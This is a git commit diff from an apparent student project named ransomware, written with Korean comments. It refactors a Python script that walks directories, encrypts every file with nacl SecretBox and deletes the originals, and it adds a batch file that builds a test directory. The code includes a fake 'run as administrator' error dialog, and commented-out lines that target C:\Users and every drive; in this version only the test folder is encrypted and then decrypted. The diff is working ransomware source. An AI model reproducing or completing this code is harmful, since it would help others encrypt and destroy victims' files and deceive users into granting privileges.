519dca517cbf663749a202ba350c1c5355f4b7db
최지웅 <gogogi313@naver.com>
2023-10-04 01:55:50 +0900

    [DEBUG, REFACTOR] 디렉토리 재귀접근 오류 수정, 테스트 디렉토리 생성bat파일 생성

--- 최지웅/main.py
+++ 최지웅/main.py
@@ -4,6 +4,7 @@ import os, sys, nacl.secret
 from PIL import Image, ImageDraw, ImageFont
 from time import sleep
 from tkinter import messagebox
+from datetime import datetime
 
 class EnDecryptor:
     def __init__(self, files=0, encryptModule=0):
@@ -12,15 +13,11 @@ class EnDecryptor:
 
     def encryptFile(self):
         try:
-            print("[DEBUG] 모듈 내부 암호화 시작. 대상", self._files)
             for file in self._files:
-                print("[DEBUG]: 파일인가요?", os.path.isfile(file))
-                if(os.path.isfile(file)==True):#파일이라면
-                    print("[DEBUG] 파일이라고 판단")
-                    if(file==sys.argv[0]):#현재의 파이썬 스크립트를 암호화하려하면 종료
+                if(os.path.isfile(file)==True):
+                    if(file==sys.argv[0]):
                         return
 
-                    print("[DEBUG] rb시작")
                     with open(file, "rb") as File:
                         data=File.read()
                     encryptedFile=self._encryptModule.encrypt(data)
@@ -29,20 +26,16 @@ class EnDecryptor:
                     os.remove(file)
                 
         except Exception as e:
-            print(f"[DEBUG] Error on encrypt.encryptFile(): {e}")
+            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
 
     def decryptFile(self):
         try:
-            print("[DEBUG] 모듈 내부 복호화 시작. 대상", self._files)
             for file in self._files:
-                print("[DEBUG]: 파일인가요?", os.path.isfile(file))
                 originName=file.strip(".LoL")
-                if(os.path.isfile(file)==True):#파일이라면
-                    print("[DEBUG] 파일이라고 판단")
-                    if(file==sys.argv[0]):#현재의 파이썬 스크립트를 암호화하려하면 종료
+                if(os.path.isfile(file)==True):
+                    if(file==sys.argv[0]):
                         return
 
-                    print("[DEBUG] rb시작")
                     with open(file, "rb") as File:
                         data=File.read()
                     decryptedFile=self._encryptModule.decrypt(data)
@@ -51,72 +44,86 @@ class EnDecryptor:
                     os.remove(file)
                 
         except Exception as e:
-            print(f"[DEBUG] Error on decrypt.decryptFile(): {e}")
-
-Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
+            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")
+if len(sys.argv)==1:
+    print("키를 랜덤하게 생성합니다")
+    Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
+elif len(sys.argv)==2:
+    with open(sys.argv[1], 'rb') as File:
+        Key=File.read()
 EncryptModule=nacl.secret.SecretBox(Key)
 MaxThread=120
 IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()
 
-PathList=[r"C:\Users\\"]
-for letter in range(97, 123):
-    drive=f"{chr(letter)}:\\"
-    if (pathlib.Path(drive).exists()):#존재하는 드라이브명 ex F:\\이면 추가
-        PathList.append(drive)
-PathList.remove("c:\\")
-PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test_dir"]#실험 디렉토리
 
-print(f"[DEBUG] Key: {Key}")
-print(f"[DEBUG] PathList: {PathList}")
+#PathList=[r"C:\Users\\"]
+#for letter in range(97, 123):
+#    drive=f"{chr(letter)}:\\"
+#    if (pathlib.Path(drive).exists()):
+#        PathList.append(drive)
+#PathList.remove("c:\\")
+
+PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\test"]
+#print(f"[DEBUG] PathList: {PathList}")
 
 def changeBackground():
-    pass
+    print("대충 경고메시지를 띄웠다고 치죠")
 
-def recursiveEncrypt(dir):#객체를 언제 생성할 것인가? 1. 매 파일마다 객체 생성? 디렉토리별로 객체생성? 드라이브별로 객체생성? 스레드 내부에서 객체생성?
-    #if(pathlib.Path(dir).exist!=True):#존재하는 경로인지 확인
-    #    print("DEBUG: 존재하지 않는 디렉토리입니다")
-    #    return
-    for path, dirs, files in os.walk(dir):
-        print("입력: ", dir)
-        for i in range(len(files)):
-            files[i]=dir+"\\"+files[i]
-            print(files[i])#파일 절대경로로
-            
-        print("현재 순회중인 디렉토리: ",dir,", dir 수: ", len(dirs), ", file 수: ",len(files))
-        if(len(files)>0):
-            EnDecryptor(files, EncryptModule).encryptFile()#파일을 우선적으로 인코딩하고_디렉별로 객체생성
+def recursiveEncrypt(basepath):
+    files=[]
+    dirs=[]
+    for entry in os.listdir(basepath):
+        absolutePath=os.path.join(basepath, entry)
+        if os.path.isfile(absolutePath):
+            files.append(absolutePath)
+        elif os.path.isdir(absolutePath):
+            dirs.append(absolutePath)
 
-        if(len(dirs)>0):
-            recursiveEncrypt(dir)#하부의 디렉토리는 재귀적으로 실행_스레드를 도입하려면 FileSize를 계산해야할
+    if (len(files)>0):
+        EnDecryptor(files, EncryptModule).encryptFile()
+    for dir in dirs:
+        recursiveEncrypt(dir)
 
-def recursiveDecrypt(dir):
-    for path, dirs, files in os.walk(dir):
-        for i in range(len(files)):
-            files[i]=dir+"\\"+files[i]
-        if(len(files)>0):
-            EnDecryptor(files, EncryptModule).decryptFile()
-        if(len(dirs)>0):
-            recursiveDecrypt(dir)
+def recursiveDecrypt(basepath):
+    files=[]
+    dirs=[]
+    for entry in os.listdir(basepath):
+        absolutePath=os.path.join(basepath, entry)
+        if os.path.isfile(absolutePath):
+            files.append(absolutePath)
+        elif os.path.isdir(absolutePath):
+            dirs.append(absolutePath)
+
+    if (len(files)>0):
+        EnDecryptor(files, EncryptModule).decryptFile()
+    for dir in dirs:
+        recursiveDecrypt(dir)
 
 def fakeAlert():
     WINDOW=tkinter.Tk()
     WINDOW.withdraw()
     messagebox.showerror("Error", "Try to re-run as administrator")
 
+def saveKey():
+    print("현재 키: ", Key)
+    with open(f"key_{datetime.now().strftime('%Y-%m-%d %H-%M-%S')}", "wb") as File:
+        File.write(Key)
+
 if __name__ == '__main__':
     print("Admin여부", IsAdmin)
+    saveKey()#랜덤하게 생성된 키를 wb로 저장
     if(IsAdmin==False):#디버그를 위한 강제실행
-        changeBackground()
-        for drive in  PathList:#실제 디렉토리
-            #recursiveEncrypt(drive)
-            print("타겟 드라이브: "+drive)#출력값만 확인
+        changeBackground()#경고메시지 세팅
         for drive in PathList_DEBUG:#실험 디렉토리
-            print("암호화 실행중인 디렉토리: ", drive)
+            print("\n==============================================================================")
+            print("***암호화가 5초 뒤 진행될 예정입니다. 타겟디렉토리를 마지막으로 확인하세요***\n", drive)
+            print("==============================================================================\n")
+            sleep(5)#이 강을 건너지 마오
             recursiveEncrypt(drive)#암호화 수행
-            sleep(2)
-            recursiveDecrypt(drive)
+            print("암호화 완료. 30초 뒤 복호화를 수행합니다")
+            sleep(30)
+            recursiveDecrypt(drive)#복호화 수행
             print("복호화 완료")
-            
             
     else:
         fakeAlert()
---
+++ 최지웅/make test directory.bat
@@ -0,0 +1,20 @@
+echo "테스트 디렉토리 생성중.."
+
+mkdir test
+
+cd test
+echo "Hello test_target1!" >> target1.txt
+echo "Hello test_target2!" >> target2.txt
+
+mkdir test_test1
+cd test_test1
+echo "Hello test_test1_target1!" >> target1.txt
+echo "Hello test_test1_target2!" >> target2.txt
+cd ..
+
+mkdir test_test2
+cd test_test2
+echo "Hello test_test2_target1!" >> target1.txt
+echo "Hello test_test2_target2!" >> target2.txt
+
+echo "테스트 디렉토리 생성완료"
